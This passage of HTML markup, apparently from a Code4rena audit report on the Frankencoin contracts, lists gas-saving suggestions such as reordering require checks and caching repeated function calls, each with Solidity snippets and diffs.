6z\"></path></svg></a>Cheaper to check the function parameter before making an external function call</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Equity</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">290</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateProceeds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">291</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">292</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">capital</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equity</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">293</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;too many shares&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// make sure there is always at least one share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">294</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTotalShares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">295</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newCapital</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_mulD18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">capital</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_power3</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_divD18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newTotalShares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">capital</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">newCapital</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">297</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>As we have a require statement verifying a functional parameter, it would be cheaper to run this check first before making an external function call.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Equity.sol b/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 7057ed6..817e37a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -289,8 +289,8 @@ contract Equity is ERC20PermitLight, MathUtil, IReserve {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function calculateProceeds(uint256 shares) public view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 totalShares = totalSupply();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 capital = zchf.equity();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(shares + ONE_DEC18 &lt; totalShares, &quot;too many shares&quot;); // make sure there is always at least one share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 capital = zchf.equity();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 newTotalShares = totalShares - shares;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 newCapital = _mulD18(capital, _power3(_divD18(newTotalShares, totalShares)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return capital - newCapital;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L88-L113\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L88-L113</a></p>\n<h3 id=\"move-the-require-statement-at-the-beginning-of-the-function\" style=\"position:relative;\"><a href=\"#move-the-require-statement-at-the-beginning-of-the-function\" aria-label=\"move the require statement at the beginning of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Move the require statement at the beginning of the function</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MintingHub</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">openPosition</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">89:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collateralAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">90:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_mintingMaximum</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initPeriodSeconds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_expirationSeconds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_challengeSeconds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">91:        </span><span class=\"mtk10\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_mintingFeePPM</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_liqPrice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reservePPM</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: truncated some chunk here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">registerPosition</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pos</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">reserve</span><span class=\"mtk1\">()), </span><span class=\"mtk12\">OPENING_FEE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_minCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;must start with min col&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>We have a require statement that validates some functional parameters. As we would end up reverting if this parameters don’t meet the requirements, it’s better to check them at the beggining of the function before performing other operations that would just waste gas in case we end up reverting</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/MintingHub.sol b/contracts/MintingHub.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 663b205..0739259 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/MintingHub.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/MintingHub.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -89,6 +89,8 @@ contract MintingHub {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address _collateralAddress, uint256 _minCollateral, uint256 _initialCollateral,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _mintingMaximum, uint256 _initPeriodSeconds, uint256 _expirationSeconds, uint256 _challengeSeconds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint32 _mintingFeePPM, uint256 _liqPrice, uint32 _reservePPM) public returns (address) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_initialCollateral &gt;= _minCollateral, &quot;must start with min col&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IPosition pos = IPosition(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             POSITION_FACTORY.createNewPosition(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 msg.sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -106,7 +108,6 @@ contract MintingHub {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         zchf.registerPosition(address(pos));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         zchf.transferFrom(msg.sender, address(zchf.reserve()), OPENING_FEE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_initialCollateral &gt;= _minCollateral, &quot;must start with min col&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IERC20(_collateralAddress).transferFrom(msg.sender, address(pos), _initialCollateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return address(pos);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L76-L86\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L76-L86</a></p>\n<h3 id=\"move-the-if-check-condition-above-the-function-call\" style=\"position:relative;\"><a href=\"#move-the-if-check-condition-above-the-function-call\" aria-label=\"move the if check condition above the function call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Move the if check condition above the function call</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializeClone</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_limit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mint</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHub</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_coll</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">minimumCollateral</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">setOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_mint</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientCollateral</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>We have an internal function call that simply sets a new owner. We also have a check of <code>price > _price</code> that would revert in case that check fails. As this is not dependent on the internal function call, we can do the check first so that incase of a revert on the <code>if (price > _price) revert InsufficientCollateral();</code> we wouldn’t waste gas doing the internal function call</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Position.sol b/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 3e18534..88ecfe5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -75,10 +75,11 @@ contract Position is Ownable, IPosition, MathUtil {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function initializeClone(address owner, uint256 _price, uint256 _limit, uint256 _coll, uint256 _mint) external onlyHub {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if(_coll &lt; minimumCollateral) revert InsufficientCollateral();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        setOwner(owner);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         price = _mint * ONE_DEC18 / _coll;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (price &gt; _price) revert InsufficientCollateral();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        setOwner(owner);</span></span></span></code></pre>\n<h2 id=\"g-02-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\" style=\"position:relative;\"><a href=\"#g-02-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\" aria-label=\"g 02 the result of a function call should be cached rather than re calling the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] The result of a function call should be cached rather than re-calling the function</h2>\n<p>External calls are expensive. Consider caching the following:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L144-L148\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L144-L148</a></p>\n<h3 id=\"equitysoladjusttotalvotes-results-of-anchortime-should-be-cached-rather-than-call-it-twice\" style=\"position:relative;\"><a href=\"#equitysoladjusttotalvotes-results-of-anchortime-should-be-cached-rather-than-call-it-twice\" aria-label=\"equitysoladjusttotalvotes results of anchortime should be cached rather than call it twice permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Equity.sol.adjustTotalVotes(): Results of anchorTime() should be cached rather than call it twice</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Equity</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">adjustTotalVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">roundingLoss</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lostVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x0</span><span class=\"mtk1\">) ? </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> : (</span><span class=\"mtk11\">anchorTime</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">voteAnchor</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from</span><span class=\"mtk1\">]) * </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalVotesAtAnchor</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint192</span><span class=\"mtk1\">(</span><span class=\"mtk11\">totalVotes</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">roundingLoss</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">lostVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalVotesAnchorTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">anchorTime</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Equity.sol b/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 7057ed6..6344fef 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -142,9 +142,10 @@ contract Equity is ERC20PermitLight, MathUtil, IReserve {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @param amount    amount to be sent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function adjustTotalVotes(address from, uint256 amount, uint256 roundingLoss) internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 lostVotes = from == address(0x0) ? 0 : (anchorTime() - voteAnchor[from]) * amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint64 _anchorTime = anchorTime();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 lostVotes = from == address(0x0) ? 0 : (_anchorTime - voteAnchor[from]) * amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         totalVotesAtAnchor = uint192(totalVotes() - roundingLoss - lostVotes);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        totalVotesAnchorTime = anchorTime();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        totalVotesAnchorTime = _anchorTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L83-L90\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L83-L90</a></p>\n<h3 id=\"frankencoinsolsuggestminter-result-of-totalsupply-should-be-cached-heresad-path\" style=\"position:relative;\"><a href=\"#frankencoinsolsuggestminter-result-of-totalsupply-should-be-cached-heresad-path\" aria-label=\"frankencoinsolsuggestminter result of totalsupply should be cached heresad path permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 